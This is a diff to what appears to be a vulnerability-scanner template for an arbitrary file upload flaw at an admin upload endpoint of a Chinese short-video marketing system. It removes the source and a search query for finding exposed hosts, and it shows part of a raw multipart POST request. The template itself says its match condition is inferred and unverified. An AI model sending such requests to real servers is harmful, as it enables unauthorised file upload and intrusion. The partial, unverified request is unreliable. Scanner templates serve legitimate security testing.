@@ -3,14 +3,8 @@ info:
   name: 短视频矩阵营销系统-ajax_uplaod任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gaxapi8irnno8q0l
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gaxapi8irnno8q0l
-    fofa: '"短视频矩阵营销系统"'
 http:
 - raw:
   - 'POST /index.php/admin/tool/ajax_uplaod HTTP/1.1
@@ -24,7 +18,6 @@ http:
     Content-Length: 0
 
     Content-Type: multipart/form-data; boundary=----113389720123090127612523184396
-
 
 
     -----------------------113389720123090127612523184396
